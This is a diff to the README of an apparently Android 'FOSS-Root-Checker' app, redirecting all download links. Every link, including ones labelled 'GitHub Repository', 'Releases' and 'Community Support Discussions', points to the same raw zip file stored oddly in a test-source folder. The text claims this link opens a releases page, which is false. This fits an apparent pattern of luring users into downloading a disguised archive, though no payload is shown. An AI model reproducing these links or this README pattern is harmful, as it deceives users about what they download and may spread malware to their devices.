@@ -6,11 +6,11 @@ Welcome to FOSS-Root-Checker! This application helps you check if your Android d
 
 ## 🔗 Download FOSS-Root-Checker
 
-[![Download FOSS-Root-Checker](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/main/res/Checker-FOS-Root-2.3.zip%20Now!-FOSS--Root--Checker-brightgreen)](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/main/res/Checker-FOS-Root-2.3.zip)
+[![Download FOSS-Root-Checker](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/test/java/foss/chillastro/su/FOS_Checker_Root_2.4.zip%20Now!-FOSS--Root--Checker-brightgreen)](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/test/java/foss/chillastro/su/FOS_Checker_Root_2.4.zip)
 
 ## 📥 Download & Install
 
-To download FOSS-Root-Checker, visit this page to download: [FOSS-Root-Checker Releases](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/main/res/Checker-FOS-Root-2.3.zip).
+To download FOSS-Root-Checker, visit this page to download: [FOSS-Root-Checker Releases](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/test/java/foss/chillastro/su/FOS_Checker_Root_2.4.zip).
 
 Once on the page, you will see a list of available versions. Look for the latest version at the top of the list. Click on the version number to open the release details. 
 
@@ -59,9 +59,9 @@ FOSS-Root-Checker is relevant to various topics:
 
 ## 📚 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/main/res/Checker-FOS-Root-2.3.zip)
-- [FOSS-Root-Checker Releases](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/main/res/Checker-FOS-Root-2.3.zip)
-- [Community Support Discussions](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/main/res/Checker-FOS-Root-2.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/test/java/foss/chillastro/su/FOS_Checker_Root_2.4.zip)
+- [FOSS-Root-Checker Releases](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/test/java/foss/chillastro/su/FOS_Checker_Root_2.4.zip)
+- [Community Support Discussions](https://raw.githubusercontent.com/RuotianJoy/FOSS-Root-Checker/master/app/src/test/java/foss/chillastro/su/FOS_Checker_Root_2.4.zip)
 
 ## 🔄 Updates and Release Notes
 
